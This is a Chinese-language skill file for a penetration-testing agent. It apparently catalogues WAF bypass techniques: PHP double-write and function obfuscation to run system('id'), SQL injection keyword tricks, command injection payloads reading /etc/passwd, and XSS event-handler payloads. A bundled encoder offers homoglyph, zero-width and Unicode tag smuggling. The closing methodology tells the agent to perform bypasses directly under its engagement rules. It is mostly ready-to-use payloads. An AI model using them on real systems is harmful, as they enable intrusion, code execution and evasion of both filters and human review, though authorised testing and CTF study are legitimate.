---
name: waf-bypass
description: WAF 绕过技巧库 — 各类WAF绕过方法
metadata:
  layer: "L3"
  risk: "L3"
  phase: "cross-cutting"
  task_types: "pentest"
---

# WAF 绕过技巧库

## PHP WAF 绕过

### preg_replace 双写绕过（关键技巧）

`preg_replace()` 会**循环替换**直到没有匹配为止，但如果关键词被替换后**拼出了新的关键词**，只会替换内层，外层保留。

**核心原理**：`preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → 删除中间的 `NSSCTF` → 剩下 `NSS` + `CTF` = `NSSCTF`

**通用模板**：
```
假设过滤关键词为 X（如 NSSCTF）
构造输入: X拆成两半, 在中间嵌入完整X
即: X前半 + X + X后半

示例:
过滤 NSSCTF → 输入 NSS + NSSCTF + CTF = NSSNSSCTFCTF
过滤 flag   → 输入 fl + flag + ag = flflagag
过滤 cat    → 输入 ca + cat + t = cacatt
过滤 system → 输入 sys + system + tem = syssystemtem
```

**为什么简单的大小写绕过不适用于 preg_replace**：
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` 不匹配 `NSS`（无 i 修饰符）→ 原样输出 `NssCTF`
- `NssCTF !== "NSSCTF"`（严格比较失败）→ 不通过
- 只有双写绕过才能让替换后**恰好得到原始关键词字符串**

**⚠️ 识别场景**：
- 源码含 `preg_replace('/关键词/', '', $input)` 且需要 `$input` 替换后**等于关键词本身** → 立即用双写绕过
- 不要尝试大小写绕过（替换后不等于原关键词）或编码绕过（编码字符串不等于原关键词）

### 函数名混淆
- Base64 编码恢复：`$f=base64_decode('c3lzdGVt');$f('id');`
- 字符串拼接：`$f='sys'.'tem';$f('id');`
- 可变函数：`$a='sys';$b='tem';$a$b('id');`

### 关键字绕过
- 拆分路径：`'/va'.'r/ww'.'w/ht'.'ml'`
- 注释绕过：`sys/**/tem('id');`
- 反转字符串：`$f=strrev('metsys');$f('id');`

## SQL 注入绕过

### 关键字绕过
- 大小写混合：`SeLeCt` 代替 `SELECT`
- 内联注释：`S/*!ELECT*/`
- 双重编码：`%2565` → `%65` → `e`
- 等价函数：`GROUP_CONCAT` 替代 `concat_ws`

### 注释符变体
- `-- -` 代替 `--`
- `--+` 代替 `-- `
- `#` 代替 `--`

## 命令注入绕过

### 分隔符变体
- 换行符：`id\nwhoami`
- 管道符：`id|whoami`
- 逻辑运算：`id&&whoami`
- 子 shell：`$(id)` 或 `` `id` ``

### 命令混淆
- 变量拼接：`a=i;b=d;$a$b`
- 通配符：`/bin/ca? /etc/pas?d`
- 空变量：`c'a't /etc/passwd`
- 转义：`c\at /etc/passwd`

## XSS 绕过

### 标签变体
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### 事件处理器
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### 编码绕过
- HTML 实体编码
- Unicode 编码
- Base64 编码（配合 eval）

## 编码变形工具（本技能自带脚本）

上文的编码手法不必手写——本技能自带零依赖编码器（仅 python3 标准库），支持链式组合。
**加载本技能即具备该能力，不需要额外加载其他技能。**

```bash
# 技能安装路径
python3 "$HOME/.config/opencode/skills/waf-bypass/scripts/encode.py" --list
python3 "$HOME/.config/opencode/skills/waf-bypass/scripts/encode.py" --encode url --text 'union select 1,2,3'
python3 "$HOME/.config/opencode/skills/waf-bypass/scripts/encode.py" --chain base64,homoglyph --text 'SELECT * FROM users'
```

> 在技能目录内也可直接 `python3 scripts/encode.py ...`。

| 编码 | 适合绕过的过滤 | 用法要点 |
|---|---|---|
| `url` | 字符级黑名单 | 百分号编码；可二次编码（`%2565` → `%65` → `e`） |
| `base64` / `base32` / `hex` | 关键词匹配 | 需目标侧存在解码点（参数解码 / eval / 反序列化） |
| `fullwidth` | ASCII 正则校验 | 全角字符绕过纯 ASCII 检查 |
| `homoglyph` | 拉丁字母关键词 | 西里尔同形字（`SELECT` → `ЅELECT`）绕过关键词匹配 |
| `rot13` / `reverse` / `payload_split` | 静态特征匹配 | 目标侧可逆还原时使用（拆分拼接、字符串反转） |
| `zw_binary` / `tag_smuggle` | 视觉不可见通道 | 零宽字符 / Unicode tag 隐写，绕过人工与简单过滤 |
| `leet` / `tokenbreak` ⚠️ | 简单关键词 | **有损**：破坏字面量可比对性，仅在目标侧有对应还原逻辑时用 |

链式规则：先内层后外层（`--chain base64,homoglyph` 表示先 base64 再同形字）；有损编码不要放在最后一步。

## 信号驱动的绕过方法论

不要"把技巧表逐条试一遍"——那把式会耗掉大量请求且难以定位有效点。正确做法是**盯住一个过滤点，每轮只改一个变量**：

```
发 baseline 请求 → 观察响应差异（全拦 / 部分拦 / 放行 / 报错 / 超时）
      ↓
从响应推断过滤层级：字符级黑名单？关键词正则？语义型 WAF？长度或类型限制？
      ↓
只改一个变量再发：编码方式 / 分隔符 / 注释符 / 大小写 / 参数位置 / 协议层
      ↓
连续 3 轮无变化 → 换思路（换注入点 / 换载荷类型 / 换协议），而非继续加大混淆
```

**硬约束**：一轮一条 payload，确保能归因到具体变量；相同 payload 不重复发送；不为凑数量盲发；已被拦截的编码组合记下，避免回退到同一路径。

**注意与 RoE 联动**：WAF 绕过属 L3 ✅ 直接做；控制速率与请求量，不中断服务；若造成稳定性影响，按疑似副作用当轮披露。
